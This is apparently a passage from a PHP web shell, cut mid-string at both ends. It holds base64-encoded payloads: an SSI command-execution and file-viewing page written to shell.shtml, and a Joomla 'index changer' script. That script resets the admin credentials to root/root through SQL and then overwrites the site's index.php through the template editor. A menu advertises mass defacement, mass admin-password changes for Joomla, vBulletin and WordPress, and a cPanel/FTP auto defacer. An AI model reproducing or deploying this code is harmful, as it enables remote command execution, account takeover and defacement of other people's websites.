PC90aXRsZT4gDQo8c3R5bGU+IA0KPCEtLSANCmJvZHkgICAgICAgICB7IGZvbnQtZmFtaWx5OiBzaGVsbDsgZm9udC1zaXplOiA4cHQgfSANCi0tPiANCmJvZHkge2ZvbnQtZmFtaWx5OiBzaGVsbDsgZm9udC1zaXplOiA5cHQ7YmFja2dyb3VuZC1jb2xvcjojMjIyMjIyO2NvbG9yOiMwMDk5MDA7dGV4dC1zaGFkb3c6MHB4IDBweCAxcHggYmxhY2s7fSANCmEge2ZvbnQtc2l6ZToxNXB4O2NvbG9yOiMwMDk5MDA7fSANCi5hcmVhIHsgY29sb3I6ICMwMGJiMDA7IGZvbnQtc2l6ZTogOXB0OyB0ZXh0LXNoYWRvdzojMDAwMDAwIDBweCAycHggN3B4OyBib3JkZXI6IHNvbGlkIDBweCAjMDA3NzAwOyBiYWNrZ3JvdW5kLWNvbG9yOnRyYW5zcGFyZW50OyBib3gtc2hhZG93OiAwcHggMHB4IDRweCAjMDA5OTAwOyAgICBwYWRkaW5nOiAzcHg7ICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA0cHg7ICAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7ICAgYm9yZGVyLXJhZGl1czogNHB4OyAgIC13ZWJraXQtYm94LXNoYWRvdzogcmdiKDAsMTE5LDApIDBweCAwcHggNHB4OyAgIC1tb3otYm94LXNoYWRvdzogcmdiKDAsMTE5LDApIDBweCAwcHggNHB4OyB9DQppbnB1dFt0eXBlPXN1Ym1pdF17IHBhZGRpbmc6IDNweDsgY29sb3I6ICMwMDc3MDsgIGZvbnQtd2VpZ2h0OiBib2xkOyB0ZXh0LWFsaWduOiBjZW50ZXI7ICB0ZXh0LXNoYWRvdzogMCAxcHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjMpOyAgYmFja2dyb3VuZDogI2FlYWVhZTsgIGJhY2tncm91bmQtY2xpcDogcGFkZGluZy1ib3g7ICBib3JkZXI6IDFweCBzb2xpZCAjMjg0NDczOyAgYm9yZGVyLWJvdHRvbS1jb2xvcjogIzIyM2I2NjsgIGJvcmRlci1yYWRpdXM6IDRweDsgIGN1cnNvcjogcG9pbnRlcjsgIGJhY2tncm91bmQtaW1hZ2U6LXdlYmtpdC1saW5lYXItZ3JhZGllbnQodG9wLCAjZWFlYWVhLCAjZDBkMGQwKTsgIGJhY2tncm91bmQtaW1hZ2U6IC1tb3otbGluZWFyLWdyYWRpZW50KHRvcCwgI2VhZWFlYSwgI2QwZDBkMCk7ICBiYWNrZ3JvdW5kLWltYWdlOiAtby1saW5lYXItZ3JhZGllbnQodG9wLCAjZWFlYWVhLCAjZDBkMGQwKTsgIGJhY2tncm91bmQtaW1hZ2U6IGxpbmVhci1ncmFkaWVudCh0byBib3R0b20sICNlYWVhZWEsICNkMGQwZDApOyAgLXdlYmtpdC1ib3gtc2hhZG93OiBpbnNldCAwIDFweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNSksIGluc2V0IDAgMCA3cHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjQpLCAwIDFweCAxcHggcmdiYSgwLCAwLCAwLCAwLjE1KTsgIGJveC1zaGFkb3c6IGluc2V0IDAgMXB4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC41KSwgaW5zZXQgMCAwIDdweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNCksIDAgMXB4IDFweCByZ2JhKDAsIDAsIDAsIDAuMTUpOyB9DQppbnB1dFt0eXBlPXRleHRdeyBwYWRkaW5nOiAzcHg7IGNvbG9yOiAjMDA5OTAwOyB0ZXh0LXNoYWRvdzogIzc3Nzc3NyAwcHggMHB4IDNweDsgYm9yZGVyOiAxcHggc29saWQgIzAwNzcwMDsgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7IGJveC1zaGFkb3c6IDBweCAwcHggNHB4ICMwMDc3MDA7ICAgIHBhZGRpbmc6IDNweDsgICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDRweDsNCiAgIC1tb3otYm9yZGVyLXJhZGl1czogNHB4OyAgIGJvcmRlci1yYWRpdXM6IDRweDsgICAtd2Via2l0LWJveC1zaGFkb3c6IHJnYig4NSw4NSw4NSkgMHB4IDBweCA0cHg7ICAgLW1vei1ib3gtc2hhZG93OiByZ2IoODUsODUsODUpIDBweCAwcHggNHB4O30NCmlucHV0W3R5cGU9c3VibWl0XTpob3ZlciwgaW5wdXRbdHlwZT10ZXh0XTpob3ZlcnsgY29sb3I6ICNmZmZmZmY7IHRleHQtc2hhZG93OiAjMDA2NjAwIDBweCAwcHggNHB4OyBib3gtc2hhZG93OiAwcHggMHB4IDRweCAjMDBkZDAwOyBib3JkZXI6IDFweCBzb2xpZCAjMDBkZDAwOyAgICBwYWRkaW5nOiAzcHg7ICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA0cHg7DQogICAtbW96LWJvcmRlci1yYWRpdXM6IDRweDsgICBib3JkZXItcmFkaXVzOiA0cHg7ICAgLXdlYmtpdC1ib3gtc2hhZG93OiByZ2JhKDAsMTE5LDApIDBweCAwcHggNHB4OyAgIC1tb3otYm94LXNoYWRvdzogcmdiYSgwLDExOSwwKSAwcHggMHB4IDRweDt9DQo8L3N0eWxlPiANCjxzY3JpcHQgbGFuZ3VhZ2U9ImphdmFzY3JpcHQiPiAgDQpmdW5jdGlvbiBkb2l0KCBtb2RlICkgeyAgDQogICAgaWYoIGRvY3VtZW50LmNvb2tpZSAhPSAiIiApIHsgIA0KICAgICAgICB2YXIgY29va2llcyA9IGRvY3VtZW50LmNvb2tpZS5zcGxpdCggIjsiICk7ICANCiAgICAgICAgZm9yKCB2YXIgaSA9IDA7IGkgPCBjb29raWVzLmxlbmd0aDsgKytpICkgICANCiAgICAgICAgICAgIGRvY3VtZW50LmNvb2tpZSA9IGNvb2tpZXNbIGkgXSArICI7ZXhwaXJlcz1UaHUsIDAxIEphbiAxOTcwIDAwOjAwOjAwIEdNVCI7ICANCiAgICB9ICANCiAgICBkb2N1bWVudC5jb29raWUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCggbW9kZSApLnZhbHVlOyAgDQogICAgZG9jdW1lbnQubG9jYXRpb24ucmVsb2FkKCk7ICANCn0gIA0KZnVuY3Rpb24gdG9nZ2xlKCBpZCApIHsgIA0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCBpZCApLnN0eWxlLmRpc3BsYXkgPSAoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIGlkICkuc3R5bGUuZGlzcGxheSA9PSAibm9uZSIpID8gImJsb2NrIiA6ICJub25lIjsgIA0KfSAgDQo8L3NjcmlwdD4gIA0KPC9oZWFkPiANCjxib2R5PiANCjxkaXYgYWxpZ249ImNlbnRlciI+IA0KICAgIDx0YWJsZSBib3JkZXI9IjEiIHdpZHRoPSIxMDAlIiBpZD0idGFibGUxIiBzdHlsZT0iYm9yZGVyOiAxcHggZG90dGVkICMwMDc3MDAiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMCIgaGVpZ2h0PSI1MDIiPiANCiAgICAgICAgPHRyPiANCiAgICAgICAgICAgIDx0ZCBzdHlsZT0iYm9yZGVyOiAxcHggZG90dGVkICMwMDc3MDAiIHZhbGlnbj0idG9wIiByb3dzcGFuPSIyIj4gDQogICAgICAgICAgICAgICAgPHAgYWxpZ249ImNlbnRlciI+PGI+IA0KICAgICAgICAgICAgICAgIDxmb250IGZhY2U9InNoZWxsIiBzaXplPSIyIj48YnI+IA0KICAgICAgICAgICAgICAgIDwvZm9udD4gDQogICAgICAgICAgICAgICAgPGZvbnQgY29sb3I9IiNlNmU2ZTYiIGZhY2U9InNoZWxsIiBzaXplPSIyIj4gDQogICAgICAgICAgICAgICAgPHNwYW4gc3R5bGU9InRleHQtZGVjb3JhdGlvbjogbm9uZSI+IA0KICAgICAgICAgICAgICAgIDxmb250IGNvbG9yPSIjMDBiYjAwIj4gDQogICAgICAgICAgICAgICAgPHNwYW4gc3R5bGU9InRleHQtZGVjb3JhdGlvbjogbm9uZSI+PGZvbnQgb25jbGljaz0idG9nZ2xlKCdpbmYnKTsiIHN0eWxlPSJjdXJzb3I6aGFuZDsiIGNvbG9yPSIjMDA5OTAwIj5TZXJ2ZXIgRGV0YWlsczwvZm9udD48L3NwYW4+PC9mb250Pjwvc3Bhbj48L2ZvbnQ+PC9iPjwvcD4gDQogICAgICAgICAgICAgICAgPHAgYWxpZ249ImNlbnRlciI+PGI+IA0KICAgICAgICAgICAgICAgIDxmb250IG9uY2xpY2s9InRvZ2dsZSgnc2hsJyk7IiBzdHlsZT0iY3Vyc29yOmhhbmQ7IiBmYWNlPSJzaGVsbCIgc2l6ZT0iMiIgY29sb3I9IiMwMDk5MDAiPiANCiAgICAgICAgICAgICAgICA8c3BhbiBzdHlsZT0idGV4dC1kZWNvcmF0aW9uOiBub25lIj5Db21tYW5kPC9zcGFuPjwvZm9udD48L2I+PC9wPiANCiAgICAgICAgICAgICAgICA8cCBhbGlnbj0iY2VudGVyIj48Yj4gDQogICAgICAgICAgICAgICAgPGZvbnQgZmFjZT0ic2hlbGwiIHNpemU9IjIiIGNvbG9yPSIjMDBiYjAwIj4gDQogICAgICAgICAgICAgICAgPHNwYW4gc3R5bGU9InRleHQtZGVjb3JhdGlvbjogbm9uZSI+PGZvbnQgb25jbGljaz0idG9nZ2xlKCdpbmMnKTsiIHN0eWxlPSJjdXJzb3I6aGFuZDsiIGNvbG9yPSIjMDA5OTAwIj5WaWV3IEZpbGVzPC9mb250Pjwvc3Bhbj48L2ZvbnQ+PC9iPjwvcD4gDQogICAgICAgICAgICAgICAgPHA+Jm5ic3A7PHAgYWxpZ249ImNlbnRlciI+Jm5ic3A7PC90ZD4gDQogICAgICAgICAgICA8dGQgaGVpZ2h0PSI0MjIiIHdpZHRoPSI4MiUiIHN0eWxlPSJib3JkZXI6IDFweCBkb3R0ZWQgIzAwNzcwMCIgYWxpZ249ImNlbnRlciI+IA0KICAgICAgICAgICAgPGZvbnQgY29sb3I9JyMwMDk5MDAnIHNpemU9JzInPlNvZndhcmUgOiA8IS0tI2VjaG8gdmFyPSJTRVJWRVJfU09GVFdBUkUiIC0tPjxicj5JUCA6PCEtLSNlY2hvIHZhcj0iUkVNT1RFX0FERFIiIC0tPjwvZm9udD48YnI+IA0KICAgICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwgQmxhY2snIGNvbG9yPScjMDA5OTAwJyBzaXplPScxJz4gDQoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKio8YnI+IA0KPGRpdiBpZD0iaW5mIiBzdHlsZT0iIj48YnI+ICANCjxiPjxmb250IGNvbG9yPSIjMDBiYjAwIj5Db25uZWN0IFNlcnZlcjwvZm9udD48L2I+OiZuYnNwOyZuYnNwOyZuYnNwOzxiPjwhLS0jZWNobyB2YXI9IlNFUlZFUl9OQU1FIiAtLT48L2I+PGJyPiAgDQo8Yj48Zm9udCBjb2xvcj0iIzAwYmIwMCI+UmVtb3RlIElwPC9mb250PjwvYj46Jm5ic3A7Jm5ic3A7Jm5ic3A7PGI+PCEtLSNlY2hvIHZhcj0iUkVNT1RFX0FERFIiIC0tPjwvYj48YnI+ICANCjxiPjxmb250IGNvbG9yPSIjMDBiYjAwIj5TZXJ2ZXIgU29mdHdhcmU8L2ZvbnQ+PC9iPjombmJzcDsmbmJzcDsmbmJzcDs8Yj48IS0tI2VjaG8gdmFyPSJTRVJWRVJfU09GVFdBUkUiIC0tPjwvYj48YnI+IA0KPGI+PGZvbnQgY29sb3I9IiMwMGJiMDAiPkN1cnJlbnQgRGlyPC9mb250PjwvYj46Jm5ic3A7Jm5ic3A7Jm5ic3A7PGI+PCEtLSNlY2hvIHZhcj0iRE9DVU1FTlRfUk9PVCIgLS0+PC9iPjxicj4gIA0KPGJyPjwvZGl2PiANCjxkaXYgIGJvcmRlcj0iMCIgaWQ9InNobCIgc3R5bGU9IiI8IS0tI2lmIGV4cHI9IlwiJFJFUVVFU1RfTUVUSE9EXCIgIT0gXCJHRVRcIiIgLS0+ZGlzcGxheTpibG9jazs8IS0tI2VuZGlmIC0tPj4gIA0KPGJyPjxiPjxmb250IGNvbG9yPSIjMDBiYjAwIj5FbnRlciBjb21tYW5kPC9mb250PjwvYj46Jm5ic3A7Jm5ic3A7Jm5ic3A7PGZvcm0gbWV0aG9kPWdldCBvbnN1Ym1pdD1kb2l0KCdjb21tYW5kJyk7PjxpbnB1dCB0eXBlPXRleHQgc2l6ZT04MCB2YWx1ZT1kaXIgaWQ9Y29tbWFuZD4mbmJzcDs8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9Q29tbWFuZD48L2Zvcm0+PGJyPiAgDQo8Y2VudGVyPjxiPjxmb250IHNpemU9KzE+UmVzdWx0czwvZm9udD48L2I+PC9jZW50ZXI+ICANCjxicj4gIA0KPGI+PGZvbnQgY29sb3I9IiMwMGJiMDAiPkV4ZWN1dGUgY29tbWFuZDwvZm9udD48L2I+OiZuYnNwOyZuYnNwOyZuYnNwOzxiPjwhLS0jZWNobyB2YXI9c2hsIC0tPjwvYj48YnI+ICANCjx0ZXh0YXJlYSBjbGFzcz0iYXJlYSIgY29scz0iMTIxIiByb3dzPSIxNSI+ICANCjwhLS0jZXhlYyBjbWQ9JHNobCAtLT4gIA0KPC90ZXh0YXJlYT4gIA0KPC9kaXY+ICANCjxkaXYgaWQ9ImluYyIgc3R5bGU9ImRpc3BsYXk6bm9uZSI+PCEtLSNpZiBleHByPSJcIiRSRVFVRVNUX01FVEhPRFwiICE9IFwiUE9TVFwiIiAtLT48IS0tI2VuZGlmIC0tPjxicj4gIA0KPGI+PGZvbnQgY29sb3I9IiMwMGJiMDAiPkVudGVyIFRoZSBGaWxlIE5hbWUgPC9mb250PjwvYj46Jm5ic3A7Jm5ic3A7Jm5ic3A7PGZvcm0gbWV0aG9kPXBvc3Qgb25zdWJtaXQ9ZG9pdCgndmZpbGUnKTs+PGlucHV0IHR5cGU9dGV4dCBzaXplPTgwIGlkPXZmaWxlPiZuYnNwOzxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT1SdW4+PC9mb3JtPjxicj4gIA0KPGI+PGZvbnQgY29sb3I9IiMwMGJiMDAiPk9wZW4gRmlsZTwvZm9udD48L2I+OiZuYnNwOyZuYnNwOyZuYnNwOzxiPjwhLS0jZWNobyB2YXI9aW5jIC0tPjwvYj48YnI+ICANCjxiPjxmb250IGNvbG9yPSIjMDBiYjAwIj5TaXplIDwvZm9udD48L2I+OiZuYnNwOyZuYnNwOyZuYnNwOzxiPjwhLS0jZnNpemUgdmlydHVhbD0kaW5jIC0tPiZuYnNwO2J5dGVzPC9iPjxicj4gIA0KPHRleHRhcmVhIGNsYXNzPSJhcmVhIiBjb2xzPSIxMjEiIHJvd3M9IjE1Ij4gIA0KPCEtLSNpbmNsdWRlIHZpcnR1YWw9JGluYyAtLT4gIA0KPC90ZXh0YXJlYT4gIA0KPGJyPjwvZGl2PiAgDQoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKio8L2ZvbnQ+PC9zcGFuPjwvcD4gDQoNCiAgICAgICAgICAgICANCiAgICAgICAgICAgIDwvdGQ+IA0KICAgICAgICA8L3RyPiANCiAgICAgICAgPHRyPiANCiAgICAgICAgICAgIDx0ZCBzdHlsZT0iYm9yZGVyOiAycHggZG90dGVkICMwMDc3MDAiPiANCiAgICAgICAgICAgIDxwIGFsaWduPSJjZW50ZXIiPjxmb250IGNvbG9yPSJncmVlbiIgc2l6ZT0iMiIgZmFjZT0iaW1wYWN0Ij48YnI+IA0KICAgICAgICAgICAgPGJyPjxhIGhyZWY9IkFub25HaG9zdCI+QW5vbkdob3N0PC9hPiANCiAgICAgICAgICAgICAgICAgIDxicj4gDQogICAgICAgICAgICA8L2ZvbnQ+PC90ZD4gDQogICAgICAgIDwvdHI+IA0KICAgIDwvdGFibGU+IA0KPC9kaXY+IA0KPC9ib2R5PiANCjwvaHRtbD4gIA==';
$file = fopen("shell.shtml" ,"w+");
$write = fwrite ($file ,base64_decode($ROFL));
fclose($file);

echo "<br><center><span style='font-size:30px; font-family:Fredericka the Great; color:#009900'>Shtml Shell Command</font></span><center><br><iframe src=shell.shtml width=75% height=60% frameborder=0></iframe></div></center>"; 
}
if(isset($_GET['action']) && $_GET['action'] == 'joommlallainxc'){
echo '<center><b class="conte">
<a href="?action=mass">Mass Deface Dirs</a> -
<a href="?action=joomla">Mass Change Admin Joomla</a> -
<a href="?action=vb">Mass Change Admin vBulletin</a> -
<a href="?action=wp">Mass Change Admin Mass WordPress</a> -
<a href="?action=wpandjmlamassdfce">Wordpress & Joomla Mass Deface</a> -
<a href="?action=wrdprshtmlinj">Wordpress Index Hijack Priv8</a> -
<a href="?action=joommlallainxc">Joomla Index Changer</a> -
<a href="?action=wpidxcngrdesr">Wordpress Index Changer</a> -
<a href="?action=cpnlndftpotdfr">Cpanel & Ftp Auto Defacer</a> </center>
</b>';

//extract joomla index changer
$coddd = 'PGxpbmsgaHJlZj0naHR0cDovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9T3JiaXRyb246NzAwJyByZWw9J3N0eWxlc2hlZXQnIHR5cGU9J3RleHQvY3NzJz4NCjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+DQpib2R5IHsNCmJhY2tncm91bmQ6DQp1cmwoImh0dHA6Ly9pLmltZ3VyLmNvbS9oZzIxeFo5LnBuZyIpIHJlcGVhdCAsIA0KdXJsKCJodHRwOi8vd3d3LmRlc2t0b3Bhcy5jb20vZmlsZXMvMjAxMi8xMS8xOC9ibHVlLWFuZC1ibGFjay1hYnN0cmFjdC0xNjAweDkwMC5qcGciKSBuby1yZXBlYXQgY2VudGVyIHRvcCx0b3AgbGVmdCx0b3AgcmlnaHQ7DQpiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDAwOw0KPC9zdHlsZT4NCjxmb250IGZhY2U9J09yYml0cm9uJz4NCjw/cGhwDQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjDQojICAgICAgQ2hhbmdlIEpvb21sYSBJbmRleCAgICAgICAgICAgICAgICAjDQojICAgICAgQ29kZWQgQnkgUkFCM09VTiAgICAgICAgICAgICAgICAgICAjDQojICAgICAgICAgIHYuYi00QGhvdG1haWwuY29tICAgICAgICAgICAgICAjDQojCSAgaHR0cDovL3d3dy5yYWIzb3VuLm5ldC8gICAgICAgICAjDQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjDQoNCmlmICgkX1BPU1RbJ2Zvcm1fYWN0aW9uJ10pDQp7DQoNCiRoPSI8PyBlY2hvKHN0cmlwc2xhc2hlcyhiYXNlNjRfZGVjb2RlKCciLnVybGVuY29kZShiYXNlNjRfZW5jb2RlKHN0cl9yZXBsYWNlKCInIiwiJyIsKCRfUE9TVFsnY29kZSddKSkpKS4iJykpKTsgZXhpdDsgPz4iOw0KDQogJGRicHJlZml4PSgkX1BPU1RbJ2RiX3ByZWZpeCddKTsNCiAkdXNlcm5hbWU9KCRfUE9TVFsnZGJfdXNlcm5hbWUnXSk7DQogJHBhc3N3b3JkPSgkX1BPU1RbJ2RiX3Bhc3N3b3JkJ10pOw0KICRkYm5hbWU9KCRfUE9TVFsnZGJfbmFtZSddKTsNCiAgJHNpdGVfdXJsPSgkX1BPU1RbJ3NpdGVfdXJsJ10pOw0KDQokY289cmFuZG9tdCgpOw0KDQoNCg0KICAgICAgJGxpbms9bXlzcWxfY29ubmVjdCgibG9jYWxob3N0IiwkdXNlcm5hbWUsJHBhc3N3b3JkKSA7DQoNCiAgICAgICAgIG15c3FsX3NlbGVjdF9kYigkZGJuYW1lLCRsaW5rKSA7DQoNCiR0cnlDaGFuaW5nSW5mbyA9IG15c3FsX3F1ZXJ5KCJVUERBVEUgIi4kZGJwcmVmaXguInVzZXJzIFNFVCB1c2VybmFtZSA9J3Jvb3QnICwgcGFzc3dvcmQgPSAnNjNhOWYwZWE3YmI5ODA1MDc5NmI2NDllODU0ODE4NDUnIik7DQplY2hvKCI8YnI+WytdIENoYW5naW5nIHJvb3QgcGFzc3dvcmQgdG8gcm9vdCIpOwkNCgkJIA0KCQkgJHJlcSA9bXlzcWxfcXVlcnkoIlNFTEVDVCAqIGZyb20gIGAiLiRkYnByZWZpeC4iZXh0ZW5zaW9uc2AgIik7DQoJCSANCmlmICggJHJlcSApDQp7DQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyAgICAgICAgVjEuNiAgICAgICAgICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjDQoNCgkJDQokcmVxID1teXNxbF9xdWVyeSgiU0VMRUNUICogZnJvbSAgYCIuJGRicHJlZml4LiJ0ZW1wbGF0ZV9zdHlsZXNgIFdIRVJFIGNsaWVudF9pZD0nMCcgYW5kIGhvbWU9JzEnIik7DQoJICRkYXRhID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHJlcSk7DQokdGVtcGxhdGVfbmFtZT0kZGF0YVsidGVtcGxhdGUiXTsNCg0KJHJlcSA9bXlzcWxfcXVlcnkoIlNFTEVDVCAqIGZyb20gIGAiLiRkYnByZWZpeC4iZXh0ZW5zaW9uc2AgV0hFUkUgbmFtZT0nIi4kdGVtcGxhdGVfbmFtZS4iJyIpOw0KCSAkZGF0YSA9IG15c3FsX2ZldGNoX2FycmF5KCRyZXEpOw0KJHRlbXBsYXRlX2lkPSRkYXRhWyJleHRlbnNpb25faWQiXTsNCg0KJHVybDI9JHNpdGVfdXJsLiIvaW5kZXgucGhwIjsNCg0KJGNoID0gY3VybF9pbml0KCk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsMik7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRk9MTE9XTE9DQVRJT04sIDEpOw0KY3VybF9zZXRvcHQoJGNoLENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsMSk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfSEVBREVSLCAxKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VU0VSQUdFTlQsICR1c2VyYWdlbnQpOw0KICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT09LSUVKQVIsICRjbyk7IA0KICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT09LSUVGSUxFLCAkY28pOyANCg0KDQokYnVmZmVyID0gY3VybF9leGVjKCRjaCk7DQoNCiRyZXR1cm49ZW50cmUydjIoJGJ1ZmZlciAsJzxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InJldHVybiIgdmFsdWU9IicsJyInKTsNCiRoaWRkZW49ZW50cmUydjIoJGJ1ZmZlciAsJzxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IicsJyIgdmFsdWU9IjEiJyw0KTsNCg0KLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQokdXJsMj0kc2l0ZV91cmwuIi9pbmRleC5waHAiOw0KJGNoID0gY3VybF9pbml0KCk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsMik7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVCwgMSk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVEZJRUxEUywidXNlcm5hbWU9cm9vdCZwYXNzd2Q9cm9vdCZvcHRpb249Y29tX2xvZ2luJnRhc2s9bG9naW4mcmV0dXJuPSIuJHJldHVybi4iJiIuJGhpZGRlbi4iPTEiKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GT0xMT1dMT0NBVElPTiwgMSk7DQpjdXJsX3NldG9wdCgkY2gsQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwxKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9IRUFERVIsIDApOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VTRVJBR0VOVCwgJHVzZXJhZ2VudCk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfQ09PS0lFSkFSLCAkY28pOyANCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT09LSUVGSUxFLCAkY28pOyANCiRidWZmZXIgPSBjdXJsX2V4ZWMoJGNoKTsNCg0KJHBvcyA9IHN0cnBvcygkYnVmZmVyLCJjb21fY29uZmlnIik7DQppZigkcG9zID09PSBmYWxzZSkgew0KZWNobygiPGJyPlstXSBMb2dpbiBFcnJvciIpOw0KZXhpdDsNCn0NCmVsc2Ugew0KZWNobygiPGJyPlsrXSBMb2dpbiBTdWNjZXNzZnVsIik7DQp9DQovLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCiR1cmwyPSRzaXRlX3VybC4iL2luZGV4LnBocD9vcHRpb249Y29tX3RlbXBsYXRlcyZ0YXNrPXNvdXJjZS5lZGl0JmlkPSIuYmFzZTY0X2VuY29kZSgkdGVtcGxhdGVfaWQuIjppbmRleC5waHAiKTsNCiRjaCA9IGN1cmxfaW5pdCgpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybDIpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLCAxKTsNCmN1cmxfc2V0b3B0KCRjaCxDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLDEpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0hFQURFUiwgMCk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVNFUkFHRU5ULCAkdXNlcmFnZW50KTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT09LSUVKQVIsICRjbyk7IA0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPT0tJRUZJTEUsICRjbyk7IA0KJGJ1ZmZlciA9IGN1cmxfZXhlYygkY2gpOw0KDQokaGlkZGVuMj1lbnRyZTJ2MigkYnVmZmVyICwnPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iJywnIiB2YWx1ZT0iMSInLDIpOw0KaWYoJGhpZGRlbjIpIHsNCmVjaG8oIjxicj5bK10gaW5kZXgucGhwIGZpbGUgZm91bmRlZCBpbiBUaGVtZSBFZGl0b3IiKTsNCn0NCmVsc2Ugew0KZWNobygiPGJyPlstXSBpbmRleC5waHAgTm90IGZvdW5kIGluIFRoZW1lIEVkaXRvciIpOw0KZXhpdDsNCn0NCmVjaG8oIjxicj5bKl0gVXBkYXRpbmcgSW5kZXgucGhwIC4uLi4uIik7DQokdXJsMj0kc2l0ZV91cmwuIi9pbmRleC5waHA/b3B0aW9uPWNvbV90ZW1wbGF0ZXMmbGF5b3V0PWVkaXQiOw0KDQokY2ggPSBjdXJsX2luaXQoKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwyKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NULCAxKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NURklFTERTLCJqZm9ybVtzb3VyY2VdPSIuJGguIiZqZm9ybVtmaWxlbmFtZV09aW5kZXgucGhwJmpmb3JtW2V4dGVuc2lvbl9pZF09Ii4kdGVtcGxhdGVfaWQuIiYiLiRoaWRkZW4yLiI9MSZ0YXNrPXNvdXJjZS5zYXZlIik7DQoNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GT0xMT1dMT0NBVElPTiwgMSk7DQpjdXJsX3NldG9wdCgkY2gsQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwxKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9IRUFERVIsIDApOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VTRVJBR0VOVCwgJHVzZXJhZ2VudCk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfQ09PS0lFSkFSLCAkY28pOyANCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT09LSUVGSUxFLCAkY28pOyANCiRidWZmZXIgPSBjdXJsX2V4ZWMoJGNoKTsNCg0KJHBvcyA9IHN0cnBvcygkYnVmZmVyLCc8ZGQgY2xhc3M9Im1lc3NhZ2UgbWVzc2FnZSI+Jyk7DQppZigkcG9zID09PSBmYWxzZSkgew0KZWNobygiPGJyPlstXSBVcGRhdGluZyBJbmRleC5waHAgRXJyb3IiKTsNCmV4aXQ7DQp9DQplbHNlIHsNCmVjaG8oIjxicj5bK10gSW5kZXgucGhwIHN1Y2Nlc3NmdWxseSBzYXZlZCIpOw0KfQ0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgICAgICBWMS42ICBFTkQgICAg